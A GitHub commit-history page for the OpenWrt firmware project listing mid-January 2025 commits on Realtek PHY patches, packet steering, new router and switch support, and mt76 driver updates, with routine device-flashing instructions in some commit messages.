* #### [generic: add pending patches for RealTek Ethernet PHYs](/openwrt/openwrt/commit/41c164d32bedb6b27ad1fd022dec6d25338db6d6 "generic: add pending patches for RealTek Ethernet PHYs Import patches to fix several issues with status reporting of RealTek 2.5G PHYs. Signed-off-by: Daniel Golle <daniel@makrotopia.org>")

  Show description for 41c164d ![dangowrt](https://avatars.githubusercontent.com/u/9948313?v=4&size=32)![Noltari](https://avatars.githubusercontent.com/u/264346?v=4&size=32)[dangowrt](/openwrt/openwrt/commits?author=dangowrt)authored and[Noltari](/openwrt/openwrt/commits?author=Noltari)committed[41c164d](/openwrt/openwrt/commit/41c164d32bedb6b27ad1fd022dec6d25338db6d6)Copy full SHA for 41c164d
* #### [generic: backport Realtek PHY patches from upstream](/openwrt/openwrt/commit/d7e82c78d7a2a84404198dab8faf8e142939eb05 "generic: backport Realtek PHY patches from upstream Adds patches for the temperature sensor on RTL822x. Signed-off-by: Álvaro Fernández Rojas <noltari@gmail.com>")

  Show description for d7e82c7[![Noltari](https://avatars.githubusercontent.com/u/264346?v=4&size=32)](/Noltari)[Noltari](/openwrt/openwrt/commits?author=Noltari)committed[d7e82c7](/openwrt/openwrt/commit/d7e82c78d7a2a84404198dab8faf8e142939eb05)Copy full SHA for d7e82c7
* #### [generic: r8169: remove reverted temperature sensor patch](/openwrt/openwrt/commit/0de9999a7819acf74f6adeaa27be363cf72409ab "generic: r8169: remove reverted temperature sensor patch The patch adding temperature sensor support for r8169 has been removed upstream and the functionality will be added to Realtek PHY instead: https://github.com/torvalds/linux/commit/1f691a1fc4bef1c5cf5f503e14e1a22fc37c97e3 Signed-off-by: Álvaro Fernández Rojas <noltari@gmail.com>")

  Show description for 0de9999[![Noltari](https://avatars.githubusercontent.com/u/264346?v=4&size=32)](/Noltari)[Noltari](/openwrt/openwrt/commits?author=Noltari)committed[0de9999](/openwrt/openwrt/commit/0de9999a7819acf74f6adeaa27be363cf72409ab)Copy full SHA for 0de9999
* #### [ucode-mod-pkgen: add ucode module for generating crypto keys/certificates](/openwrt/openwrt/commit/2c78e9d7bd153210d576806d40b17895d41ae93c "ucode-mod-pkgen: add ucode module for generating crypto keys/certificates This also includes a script to use the functionality from the command line Signed-off-by: Felix Fietkau <nbd@nbd.name>")

  Show description for 2c78e9d[![nbd168](https://avatars.githubusercontent.com/u/2529314?v=4&size=32)](/nbd168)[nbd168](/openwrt/openwrt/commits?author=nbd168)committed[2c78e9d](/openwrt/openwrt/commit/2c78e9d7bd153210d576806d40b17895d41ae93c)Copy full SHA for 2c78e9d
* #### [uci: update to Git HEAD (2025-01-17)](/openwrt/openwrt/commit/44c877f1973b923a2032ce9d880f496a2b077ef6 "uci: update to Git HEAD (2025-01-17) fb3c2343b17b add support for an override config directory Signed-off-by: Felix Fietkau <nbd@nbd.name>")

  Show description for 44c877f[![nbd168](https://avatars.githubusercontent.com/u/2529314?v=4&size=32)](/nbd168)[nbd168](/openwrt/openwrt/commits?author=nbd168)committed[44c877f](/openwrt/openwrt/commit/44c877f1973b923a2032ce9d880f496a2b077ef6)Copy full SHA for 44c877f
* #### [mediatek: remove obsolete base-files scripts](/openwrt/openwrt/commit/48e1427ffa867bddc822a463af862b9dacc5bde8 "mediatek: remove obsolete base-files scripts Signed-off-by: Felix Fietkau <nbd@nbd.name>")

  Show description for 48e1427[![nbd168](https://avatars.githubusercontent.com/u/2529314?v=4&size=32)](/nbd168)[nbd168](/openwrt/openwrt/commits?author=nbd168)committed[48e1427](/openwrt/openwrt/commit/48e1427ffa867bddc822a463af862b9dacc5bde8)Copy full SHA for 48e1427
* #### [netifd: improve packet steering on ipq40xx (and possibly others)](/openwrt/openwrt/commit/acce25b789d40f2d88a2326a7d9921bd1743fe54 "netifd: improve packet steering on ipq40xx (and possibly others) Some platforms a single ethernet device for all ports with multiple rx rings and NAPI threading enabled. In this case, the steering script was limiting performance by keeping all NAPI threads assigned to the same CPU. Fix this by assigning each rx queue and the corresponding NAPI task separately. Additionally, if the number of rx queues is at least as big as the number of CPUs, skip weight based assignment and distribute the load across all CPUs directly. Fixes: https://github.com/openwrt/openwrt/issues/17611 Signed-off-by: Felix Fietkau <nbd@nbd.name>")

  Show description for acce25b[![nbd168](https://avatars.githubusercontent.com/u/2529314?v=4&size=32)](/nbd168)[nbd168](/openwrt/openwrt/commits?author=nbd168)committed[acce25b](/openwrt/openwrt/commit/acce25b789d40f2d88a2326a7d9921bd1743fe54)Copy full SHA for acce25b
### Commits on Jan 16, 2025

* #### [realtek: Use atomic poll for aux-mdio commands](/openwrt/openwrt/commit/693c1ea81a314cfa37a60a293568d2e46282b717 "realtek: Use atomic poll for aux-mdio commands regmap_read_poll_timeout() relies on usleep_range() to time the polling loop. With the current, rather large, scheduling interval, a short usleep_range() may take a lot longer than expected, causing performance issues. Switch the driver over to using regmap_read_poll_timeout_atomic(), which uses udelay() to time the polling loop. For comparision, the 'ethtool -m <dev>' command is about 10 times faster with the atomic variant. Using 'perf -r10 ethtool -m lan25': - Driver using regmap_read_poll_timeout(): 2.0117 +- 0.0118 seconds time elapsed ( +- 0.58% ) - Driver using regmap_read_poll_timeout_atomic(): 0.1674 +- 0.0250 seconds time elapsed ( +- 14.95% ) Signed-off-by: Sander Vanheule <sander@svanheule.net>")

  Show description for 693c1ea[![svanheule](https://avatars.githubusercontent.com/u/6670918?v=4&size=32)](/svanheule)[svanheule](/openwrt/openwrt/commits?author=svanheule)committed[693c1ea](/openwrt/openwrt/commit/693c1ea81a314cfa37a60a293568d2e46282b717)Copy full SHA for 693c1ea
* #### [realtek: HPE 1920 24G PoE+ 180W/370W move fans to hwmon](/openwrt/openwrt/commit/0a7c8ed9d94930ba062c71df79f63c06eeab4543 "realtek: HPE 1920 24G PoE+ 180W/370W move fans to hwmon Apply the equivalent of commit f64541db020e (\"realtek: HPE 1920 8G PoE+ 180W move fans to hwmon\") to the 24-ports variants of the HPE 1920 PoE+ switches, with model numbers JG925A and JG926A. Copy from the original commit message: Move to using hwmon and gpio-fan. This is by adding gpio_fan_array to DTS and kmod-hwmon-gpiofan to DEVICE_PACKAGES. In combination with the new rtl8231 gpio driver the default fan behaviour will be maximum fan speed. Bump compat value to 1.1 due to existing config in /etc/config/system via gpio_switch. Also notify in device compat that fan is now going to be at bootloader setting (maximum in this case) by default unless turned down. As the init script 03_gpio_switches does not perform any action after removing these devices from it, the file can be dropped. Link: https://github.com/openwrt/openwrt/pull/17598 Signed-off-by: Fabian Groffen <grobian@gentoo.org> Signed-off-by: Sander Vanheule <sander@svanheule.net>")

  Show description for 0a7c8ed ![grobian](https://avatars.githubusercontent.com/u/667105?v=4&size=32)![svanheule](https://avatars.githubusercontent.com/u/6670918?v=4&size=32)[grobian](/openwrt/openwrt/commits?author=grobian)authored and[svanheule](/openwrt/openwrt/commits?author=svanheule)committed[0a7c8ed](/openwrt/openwrt/commit/0a7c8ed9d94930ba062c71df79f63c06eeab4543)Copy full SHA for 0a7c8ed
### Commits on Jan 15, 2025

* #### [netifd: fix napi process name matching in packet steering script](/openwrt/openwrt/commit/67a4aeef6c63e5836bd6b82faf6cc15934869efb "netifd: fix napi process name matching in packet steering script Fixes CPU usage imbalance on some devices using threaded NAPI Signed-off-by: Felix Fietkau <nbd@nbd.name>")

  Show description for 67a4aee[![nbd168](https://avatars.githubusercontent.com/u/2529314?v=4&size=32)](/nbd168)[nbd168](/openwrt/openwrt/commits?author=nbd168)committed[67a4aee](/openwrt/openwrt/commit/67a4aeef6c63e5836bd6b82faf6cc15934869efb)Copy full SHA for 67a4aee
* #### [uboot-envtools: ipq807x: remove number of blocks and code simplification](/openwrt/openwrt/commit/9decfc82dcd0d9d90fbdbddebba053492c594ca4 "uboot-envtools: ipq807x: remove number of blocks and code simplification Envtools can automatically detect the number of blocks. Signed-off-by: Paweł Owoc <frut3k7@gmail.com> Link: https://github.com/openwrt/openwrt/pull/17463 Signed-off-by: Robert Marko <robimarko@gmail.com>")

  Show description for 9decfc8 ![testuser7](https://avatars.githubusercontent.com/u/10881063?v=4&size=32)![robimarko](https://avatars.githubusercontent.com/u/1360816?v=4&size=32)[testuser7](/openwrt/openwrt/commits?author=testuser7)authored and[robimarko](/openwrt/openwrt/commits?author=robimarko)committed[9decfc8](/openwrt/openwrt/commit/9decfc82dcd0d9d90fbdbddebba053492c594ca4)Copy full SHA for 9decfc8
* #### [qualcommax: ipq807x: add support for Linksys HomeWRK](/openwrt/openwrt/commit/07f8319d2d9166a41c2fd94ec1422bcd80ada991 "qualcommax: ipq807x: add support for Linksys HomeWRK Hardware specification: ======== SoC: Qualcomm IPQ8174 Flash: 1GB (Micron MT29F8G08ABBCAH4 or AMD/Spansion S34MS08G2) RAM: 2GB (2x Kingston B5116ECMDXGJD or ESMT M15T2G16128A DDR3L) Ethernet: 4x 10/100/1000Mbps (Qualcomm QCA8075) WiFi1: 5GHz ax 2x2 (Qualcomm QCN5054 + Skyworks SKY85755-11) - channels 36-64 (low band) WiFi2: 2.4GHz ax 2x2 (Qualcomm QCN5024 + Skyworks SKY85340-11) WiFi3: 5GHz ax 4x4 (Qualcomm QCN5054 + Skyworks SKY85755-11) - channels 100-177 (high band) LED: 1x RGB status (NXP PCA9633) USB: 1x USB 3.0 Button: WPS, Reset Flash instructions: ======== 1. Installation from initramfs image using USB drive: Put the initramfs image on the USB drive: - dd bs=1M if=openwrt-qualcommax-ipq807x-linksys_homewrk-initramfs-uImage.itb of=/dev/sdX Connect serial console (JST PH 6-pin connector): - 1 - GND, 2 - TX, 4 - RX (115200, 8N1, 3.3V) Stop u-boot and run: - usb start && usbboot 44000000 0 && bootm 44000000 Write firmware to the flash from initramfs: - sysupgrade -n openwrt-qualcommax-ipq807x-linksys_homewrk-squashfs-sysupgrade.bin or - ubiformat /dev/mtd22 -y -f openwrt-qualcommax-ipq807x-linksys_homewrk-squashfs-factory.ubi 2. USB recovery: Put the initramfs image on the USB: - dd bs=1M if=openwrt-qualcommax-ipq807x-linksys_homewrk-initramfs-uImage.itb of=/dev/sdX Set u-boot env: - fw_setenv bootusb 'usb start && usbboot 44000000 0 && bootm 44000000' - fw_setenv bootcmd 'run bootusb; bootipq' Signed-off-by: Paweł Owoc <frut3k7@gmail.com> Link: https://github.com/openwrt/openwrt/pull/17463 Signed-off-by: Robert Marko <robimarko@gmail.com>")

  Show description for 07f8319 ![testuser7](https://avatars.githubusercontent.com/u/10881063?v=4&size=32)![robimarko](https://avatars.githubusercontent.com/u/1360816?v=4&size=32)[testuser7](/openwrt/openwrt/commits?author=testuser7)authored and[robimarko](/openwrt/openwrt/commits?author=robimarko)committed[07f8319](/openwrt/openwrt/commit/07f8319d2d9166a41c2fd94ec1422bcd80ada991)Copy full SHA for 07f8319
* #### [realtek: HPE 1920 8G PoE+ 180W move fans to hwmon](/openwrt/openwrt/commit/f64541db020ef5689186609e8b7b7a3bb9755160 "realtek: HPE 1920 8G PoE+ 180W move fans to hwmon The GPIO numbering has changed and is not stable. As a result fan control via gpio_switch is broken, resulting in errors: \"export_store: invalid GPIO 456\" Move to using hwmon and gpio-fan. This is by adding gpio_fan_array to DTS and kmod-hwmon-gpiofan to DEVICE_PACKAGES. In combination with the new rtl8231 gpio driver the default fan behaviour will be maximum fan speed. Bump compat value to 1.1 due to existing config in /etc/config/system via gpio_switch. Also notify in device compat that fan is now going to be at bootloader setting (maximum in this case) by default unless turned down. Signed-off-by: Evan Jobling <evan@jobling.au> Link: https://github.com/openwrt/openwrt/pull/17605 Signed-off-by: Sander Vanheule <sander@svanheule.net>")

  Show description for f64541d ![evs93](https://avatars.githubusercontent.com/u/181573430?v=4&size=32)![svanheule](https://avatars.githubusercontent.com/u/6670918?v=4&size=32)[evs93](/openwrt/openwrt/commits?author=evs93)authored and[svanheule](/openwrt/openwrt/commits?author=svanheule)committed[f64541d](/openwrt/openwrt/commit/f64541db020ef5689186609e8b7b7a3bb9755160)Copy full SHA for f64541d
* #### [armsr: change image names to 'combined-efi'](/openwrt/openwrt/commit/c9ebd4fb30773ca55cc2da6b2c1962046a2e0fff "armsr: change image names to 'combined-efi' luci-app-attendedsysupgrade expects images to be named 'combined-efi' when the system is using EFI images. This came about as x86 has 'combined' images for legacy (BIOS) boot and 'combined-efi' for EFI systems. armsr images were originally named 'combined' only as there was no 'legacy' image type. To avoid special handling in the attendedsysupgrade code, name EFI images consistent with other targets. Signed-off-by: Mathew McBride <matt@traverse.com.au> Link: https://github.com/openwrt/luci/pull/6430 Link: https://github.com/openwrt/openwrt/pull/12963 Signed-off-by: Petr Štetiar <ynezz@true.cz>")

  Show description for c9ebd4f ![mcbridematt](https://avatars.githubusercontent.com/u/26113015?v=4&size=32)![dangowrt](https://avatars.githubusercontent.com/u/9948313?v=4&size=32)[mcbridematt](/openwrt/openwrt/commits?author=mcbridematt)authored and[dangowrt](/openwrt/openwrt/commits?author=dangowrt)committed[c9ebd4f](/openwrt/openwrt/commit/c9ebd4fb30773ca55cc2da6b2c1962046a2e0fff)Copy full SHA for c9ebd4f
### Commits on Jan 14, 2025

* #### [ramips: mt7621: add support for Confiabits MT7621 v1](/openwrt/openwrt/commit/1c5ca24da6cd727f4fcb8edbe00fa66543a6c678 "ramips: mt7621: add support for Confiabits MT7621 v1 Hardware: - SoC: MediaTek MT7621DAT - Flash: 16 MiB cFeon - RAM: 128 MiB MT7621DAT - WLAN: 2.4 GHz (MT7603EN), 5 GHz (MT7613BEN 802.11ac) - Ethernet: 1x 10/100/1000 Mbps WAN, 3x 10/100/1000 LAN (MT7621DAT) - Buttons: 1 Reset button, 1 WPS button - LEDs: 5x Green (POWER/WAN/2.4G/5G/WPS), 1x Red (WAN) - Serial console: unpopulated header, 57600 8n1 - Power: 12 VDC, 1 A MAC: LAN MAC: label mac (eeprom@4) WAN MAC: label mac (eeprom@4) 2.4G MAC: label mac (eeprom@4) 5G MAC: label mac + 1 (eeprom@8004) Installation: The stock firmware is OpenWrt-based. If you can reach LuCI or SSH, just use the sysupgrade image with the 'Keep settings' option turned off. Signed-off-by: Luis Mita <luis@luismita.com> Link: https://github.com/openwrt/openwrt/pull/17534 Signed-off-by: Hauke Mehrtens <hauke@hauke-m.de>")

  Show description for 1c5ca24 ![LuisMitaHL](https://avatars.githubusercontent.com/u/1631086?v=4&size=32)![hauke](https://avatars.githubusercontent.com/u/78494?v=4&size=32)[LuisMitaHL](/openwrt/openwrt/commits?author=LuisMitaHL)authored and[hauke](/openwrt/openwrt/commits?author=hauke)committed[1c5ca24](/openwrt/openwrt/commit/1c5ca24da6cd727f4fcb8edbe00fa66543a6c678)Copy full SHA for 1c5ca24
* #### [lldpd: fix config for build without LLDP-MED](/openwrt/openwrt/commit/2c22d7c3a4a7edcce1af656c8cddb1ab163e3d02 "lldpd: fix config for build without LLDP-MED The lldp_class and lldp_location config option are only valid when compiled with LLDP-MED support. If not they will cause lldpd not to start. Signed-off-by: Sebastian Pflieger <sebastian@pflieger.email> Link: https://github.com/openwrt/openwrt/pull/17571 Signed-off-by: Robert Marko <robimarko@gmail.com>")

  Show description for 2c22d7c ![spflieger](https://avatars.githubusercontent.com/u/41189267?v=4&size=32)![robimarko](https://avatars.githubusercontent.com/u/1360816?v=4&size=32)[spflieger](/openwrt/openwrt/commits?author=spflieger)authored and[robimarko](/openwrt/openwrt/commits?author=robimarko)committed[2c22d7c](/openwrt/openwrt/commit/2c22d7c3a4a7edcce1af656c8cddb1ab163e3d02)Copy full SHA for 2c22d7c
* #### [build: use lazy evaluation for NPROC to speed up metadata dump](/openwrt/openwrt/commit/dac8021297a5541eac418fb295a9013109d39a61 "build: use lazy evaluation for NPROC to speed up metadata dump Reduces package metadata dump time by ~10% Signed-off-by: Felix Fietkau <nbd@nbd.name>")

  Show description for dac8021[![nbd168](https://avatars.githubusercontent.com/u/2529314?v=4&size=32)](/nbd168)[nbd168](/openwrt/openwrt/commits?author=nbd168)committed[dac8021](/openwrt/openwrt/commit/dac8021297a5541eac418fb295a9013109d39a61)Copy full SHA for dac8021
* #### [mt76: update to Git HEAD (2025-01-14)](/openwrt/openwrt/commit/3963dab0302ae29cbf2acf28f26c1432e4ddf1a5 "mt76: update to Git HEAD (2025-01-14) cf4e709e493a wifi: mt76: mt7996: fix crash in mt7996_set_radar_background 4c786fa52bb2 wifi: mt76: mt7915: fix register mapping 849923df3dde wifi: mt76: mt7996: fix register mapping 6be1dc9a1c79 wifi: mt76: mt7925: fix the unfinished command of regd_notifier before suspend d33ea3cab72b wifi: mt76: mt7925: fix CLC command timeout when suspend/resume 5aacd0d73c80 wifi: mt76: mt7925: add handler to hif suspend/resume event e86e97e45397 wifi: mt76: mt7925e: fix too long of wifi resume time e43df6bf4892 wifi: mt76: mt7996: fix thermal sparse warning 02f453d8dfc8 wifi: mt76: fix survey regression 7279e3f3c3e0 wifi: mt76: mt7925: fix unused-but-set warning 49c0bd66da3b wifi: mt76: mt7996: fix unused-but-set variable 2c068c96382e wifi: mt76: fix crash in mt76_switch_vif_chanctx 731070da2c2a wifi: mt76: mt7996: add max mpdu len capability 99d8ed164a96 wifi: mt76: mt7996: fix the capability of reception of EHT MU PPDU 32ee924831ba wifi: mt76: mt7996: fix HE Phy capability 9b588c7fb333 wifi: mt76: mt7996: fix incorrect indexing of MIB FW event 46798905cf5a wifi: mt76: connac: adjust phy capabilities based on band constraints 5c50f6f7dafe wifi: mt76: mt7996: fix definition of tx descriptor 9cdb62dc084f wifi: mt76: mt7996: fix ldpc setting 8c6cb2f97fe0 wifi: mt76: mt7996: fix beacon command during disabling 8e4f72b682e9 wifi: mt76: mt7996: add implicit beamforming support for mt7992 Signed-off-by: Felix Fietkau <nbd@nbd.name>")

  Show description for 3963dab[![nbd168](https://avatars.githubusercontent.com/u/2529314?v=4&size=32)](/nbd168)[nbd168](/openwrt/openwrt/commits?author=nbd168)committed[3963dab](/openwrt/openwrt/commit/3963dab0302ae29cbf2acf28f26c1432e4ddf1a5)Copy full SHA for 3963dab
## Pagination

[Previous](/openwrt/openwrt/commits/master?before=9454331b7fc896704a2c60b28767c282eb9ca0bd+0)[Next](/openwrt/openwrt/commits/master?after=9454331b7fc896704a2c60b28767c282eb9ca0bd+34)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


